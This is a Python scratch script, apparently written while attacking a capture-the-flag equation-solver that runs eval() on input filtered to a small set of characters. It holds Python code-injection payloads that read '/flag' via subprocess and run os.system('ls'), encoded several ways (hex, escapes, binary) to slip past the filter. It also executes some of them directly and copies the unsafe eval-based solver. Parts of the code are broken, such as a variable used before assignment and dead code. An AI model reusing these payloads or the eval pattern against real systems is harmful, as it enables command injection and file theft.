#!/usr/bin/env python3
import re
import sys
import codecs
import binascii

def to_hex(t, nbytes):
    """Format text t as a sequence of nbyte long values
    separated by spaces.
    """
    chars_per_item = nbytes * 2
    hex_version = binascii.hexlify(t)
    return b' '.join(
        hex_version[start:start + chars_per_item]
        for start in range(0, len(hex_version), chars_per_item)
    )

def main():
    # allowed='+-*/%0.123456789([)]x='
    # >>> '__import__("subprocess").check_output(["cat", "/flag"])'.encode("hex_codec")
    # '5f5f696d706f72745f5f282273756270726f6365737322292e636865636b5f6f7574707574285b22636174222c20222f666c6167225d29'
    # [ord(c) for c in '5f5f696d706f72745f5f282273756270726f6365737322292e636865636b5f6f7574707574285b22636174222c20222f666c6167225d29']
    # '5f5f696d706f72745f5f282273756270726f6365737322292e636865636b5f6f7574707574285b22636174222c20222f666c6167225d29'
    # 5f5f696d706f72745f5f282273756270726f6365737322292e636865636b5f6f7574707574285b22636174222c20222f666c6167225d29
    # 0x5f0x5f0x690x6d0x700x6f0x720x740x5f0x5f0x280x220x730x750x620x700x720x6f0x630x650x730x730x220x290x2e0x630x680x650x630x6b0x5f0x6f0x750x740x700x750x740x280x5b0x220x630x610x740x220x2c0x200x220x2f0x660x6c0x610x670x220x5d0x29
    # 5f 5f 69 6d 70 6f 72 74 5f 5f 28 22 73 75 62 70 72 6f 63 65 73 73 22 29 2e 63 68 65 63 6b 5f 6f 75 74 70 75 74 28 5b 22 63 61 74 22 2c 20 22 2f 66 6c 61 67 22 5d 29

    str1=b'__import__("subprocess").check_output(["cat", "/flag"])'
    str2=b'__import__("os").system("ls")'
    str3=b"print('ok')"
    str5=b'__import__("os").system("ls")'
    str6='5f5f696d706f72745f5f28226f7322292e6765746377642829'
    str7 = '356a192b7913b04c54574d18c28d46e6395428ab'
    print(binascii.a2b_hex(str6))
    print(binascii.a2b_hex(str7))
    print(binascii.unhexlify(str7))
    #print(str6.decode("hex"))
    print(bytes.fromhex(str6))
    print(eval('bytes.fromhex(str6)'))
    # print(str1.encode('hex'))
    # str5 = str1.encode('latin-1')

    formula1='\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x63\x68\x65\x63\x6b\x5f\x6f\x75\x74\x70\x75\x74\x28\x5b\x22\x63\x61\x74\x22\x2c\x20\x22\x2f\x66\x6c\x61\x67\x22\x5d\x29'
    formula2='\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x6c\x73\x22\x29'
    formula3='[112,114,105,116,40,39,111,107,39,41]'
    gg=[]
    gg+=[12]
    gg+=[14]
    print(gg)
    if len(sys.argv) > 1:
        formula1=str(sys.argv[1])

    bin2='01011111 01011111 01101001 01101101 01110000 01101111 01110010 01110100 01011111 01011111 00101000 00100010 01101111 01110011 00100010 00101001 00101110 01110011 01111001 01110011 01110100 01100101 01101101 00101000 00100010 01101100 01110011 00100010 00101001'
    xxx=("112","114");
    g='0x53'+'0x102'+'0x53'+'0x102'+'0x54'+'0x57'+'0x54'+'0x100'+'0x55'+'0x48'+'0x54'+'0x102'+'0x55'+'0x50'+'0x55'+'0x52'+'0x53'+'0x102'+'0x53'+'0x102'+'0x50'+'0x56'+'0x50'+'0x50'+'0x55'+'0x51'+'0x55'+'0x53'+'0x54'+'0x50'+'0x55'+'0x48'+'0x55'+'0x50'+'0x54'+'0x102'+'0x54'+'0x51'+'0x54'+'0x53'+'0x55'+'0x51'+'0x55'+'0x51'+'0x50'+'0x50'+'0x50'+'0x57'+'0x50'+'0x101'+'0x54'+'0x51'+'0x54'+'0x56'+'0x54'+'0x53'+'0x54'+'0x51'+'0x54'+'0x98'+'0x53'+'0x102'+'0x54'+'0x102'+'0x55'+'0x53'+'0x55'+'0x52'+'0x55'+'0x48'+'0x55'+'0x53'+'0x55'+'0x48'+'0x55'+'0x52'+'0x50'+'0x56'+'0x53'+'0x98'+'0x50'+'0x50'+'0x54'+'0x51'+'0x54'+'0x49'+'0x55'+'0x52'+'0x50'+'0x50'+'0x50'+'0x99'+'0x50'+'0x48'+'0x50'+'0x50'+'0x50'+'0x102'+'0x54'+'0x54'+'0x54'+'0x99'+'0x54'+'0x49'+'0x54'+'0x55'+'0x50'+'0x50'+'0x53'+'0x100'+'0x50'+'0x57'
    g2='0x530x1020x530x1020x540x570x540x1000x550x480x540x1020x550x500x550x520x530x1020x530x1020x500x560x500x500x550x510x550x530x540x500x550x480x550x500x540x1020x540x510x540x530x550x510x550x510x500x500x500x570x500x1010x540x510x540x560x540x530x540x510x540x980x530x1020x540x1020x550x530x550x520x550x480x550x530x550x480x550x520x500x560x530x980x500x500x540x510x540x490x550x520x500x500x500x990x500x480x500x500x500x1020x540x540x540x990x540x490x540x550x500x500x530x1000x500x57'
    g3="eval('%x%x%x%x%x%x%x%x%x%x%x'%(112,114,105,110,116,40,34,110,111,34,41))"

    passwrd=str(eval('__import__("os").system("ls")'))
    strtest="ok1"
    # multrPattern = re.compile(r"^(\(.*x.*\))\*(\(.*\))=(.*)$")
    # finalPattern = re.compile(r"^(\(x\)|x)=(.*)$")
    # t1=multrPattern.match(formula1)

    # t=finalPattern.match("((x)=(a)")
    # t2=t1.group(1).count('(')
    # passwrd="eval('__import__('os').getcwd()')"
    # print(b'__import__("subprocess").check_output(["cat", "/flag"])'.decode("utf-8"))
    # print(passwrd)
    # print(bytes(passwrd, 'utf-8'))
    # print(repr(strtest.encode('utf-8').hex()))
    # print(strtest.encode('utf-8').hex())
    # print(repr(strtest.encode('utf-8')))
    # print(to_hex(str1, 1))
    # " ".join("{:02x}".format(ord(x)) for x in a)

    # TEST ALLOWED CHARACTERS
    allowed='+-*/%0.123456789([)]x='
    for i in formula1:
        if not i in allowed:
            print("error: i: {}".format(i))
        else:
            print("valid: i: {}".format(i))

    multrPattern = re.compile(r"^(\(.*x.*\))\*(\(.*\))=(.*)$")
    # (0x)*(2)=0
    multlPattern = re.compile(r"^(\(.*\))\*(\(.*x.*\))=(.*)$")
    # (2)*(1x)=2
    addrPattern = re.compile(r"^(\(.*x.*\))\+(\(.*\))=(.*)$")
    addlPattern = re.compile(r"^(\(.*\))\+(\(.*x.*\))=(.*)$")
    subrPattern = re.compile(r"^(\(.*x.*\))-(\(.*\))=(.*)$")
    sublPattern = re.compile(r"^(\(.*\))-(\(.*x.*\))=(.*)$")
    divrPattern = re.compile(r"^(\(.*x.*\))\/(\(.*\))=(.*)$")
    divlPattern = re.compile(r"^(\(.*\))\/(\(.*x.*\))=(.*)$")
    bracketPattern = re.compile(r"^\((.*x.*)\)=(.*)$")
    finalPattern = re.compile(r"^(\(x\)|x)=(.*)$")
    try:
        while not finalPattern.match(formula1) and response=='':
            match=multrPattern.match(formula1)
            print("1. match: {}".format(match))
            if (match and match.group(1).count('(') == match.group(1).count(')') and match.group(2).count('(') == match.group(2).count(')')):
                formula1=match.group(1)+'='+str(eval(match.group(3)+'/'+match.group(2)))
                print("2. match: {}".format(match))
                continue
            match=multlPattern.match(formula1)
            print("1. match: {}".format(match))
            if (match and match.group(1).count('(') == match.group(1).count(')') and match.group(2).count('(') == match.group(2).count(')')):
                formula1=match.group(2)+'='+str(eval(match.group(3)+'/'+match.group(1)))
                print("2. match: {}".format(match))
                continue
            match=divrPattern.match(formula1)
            print("1. match: {}".format(match))
            if (match and match.group(1).count('(') == match.group(1).count(')') and match.group(2).count('(') == match.group(2).count(')')):
                formula1=match.group(1)+'='+str(eval(match.group(3)+'*'+match.group(2)))
                print("2. match: {}".format(match))
                continue
            match=divlPattern.match(formula1)
            print("1. match: {}".format(match))
            if (match and match.group(1).count('(') == match.group(1).count(')') and match.group(2).count('(') == match.group(2).count(')')):
                formula1=match.group(2)+'='+str(eval(match.group(1)+'/'+match.group(3)))
                print("2. match: {}".format(match))
                continue
            response='I\'m not able to solve the equation you gave me... Remember to put brackets around about everything.\nFor example: (2)*((x)+(3))=    8\n'
            break
            match=bracketPattern.match(formula1)
            print("1. match: {}".format(match))
            if (match and match.group(1).count('(') == match.group(1).count(')')):
                formula1=match.group(1)+'='+match.group(2)
                print("2. match: {}".format(match))
                continue
        if response=='':
            x=finalPattern.match(formula1).group(2)
            print("x: {}".format(x))
            response=str(eval(x))+'\n'
            print("reponse: {}".format(response))
    except:
        response='Something went wrong trying to solve your equation...\n'
    print("reponse: {}".format(response))

    # TEST EVALS
    print("\nTEST EVALS:")
    print(int("5F",16))
    print(0x5f-12)
    #print("formula1: %x" %formula1)
    #print("eval1: {0}".format(eval(formula1)))
    print("eval2: {0}".format(eval('__import__("os").getcwd()')))
    print("eval3: {0}".format(eval('0x53')))
    print("eval4: {0}".format(eval('\x70\x72\x69\x6e\x74\x28\x22\x6e\x6f\x22\x29')))
    print(g)
    print(g2)
    print(g3)
    print(eval(formula3))
    print("0x112"+"0x114")
    # print(str3)
    # print(formula1)
    # print(eval(passwrd))
    # print("eval: {0}".format(eval(formula1)))
    # print([ord(c) for c in g])
    # print([chr(c) for c in g])
    # print("eval1: {0}".format(eval('x[]=(0x70)(0x72)(0x69)(0x6e)(0x74)(0x28)(0x22)(0x6e)(0x6f)(0x22)(0x29)')))
    # print("t1: {}".format(t1))
    # print("t2: {}".format(t2))
    # 'print("no")'.encode("hex_codec")
    # xxxx="0x5f"+"0x5f"+"0x69"+"0x6d"+"0x70"+"0x6f"+"0x72"+"0x74"+"0x5f"+"0x5f"+"0x28"+"0x22"+"0x6f"+"0x73"+"0x22"+"0x29"+"0x2e"+"0x73"+"0x79"+"0x73"+"0x74"+"0x65"+"0x6d"+"0x28"+"0x22"+"0    x6c"+"0x73"+"0x22"+"0x29"
    # print(eval(g2))
    # finalPattern = re.compile(r"^(\(x\)|x)=(.*)$")
    # print(eval('__import__("os").getcwd()'))
    '''pattern=re.compile("o")
    b=pattern.match("ogo")
    print(b.group(0))'''
    '''aa=0x1+0x1
    print("aa: " + str(aa) + "\n")
    a=re.compile(r"a{1,3}")
    print(a.search('rrrddabbasaaa'))
    c=a.search('rrrddabbasaaa')
    print(c.group())
    d=a.match('abbasaaa')
    print(d)
    print(d.group(0))'''

if __name__=='__main__':
    main()
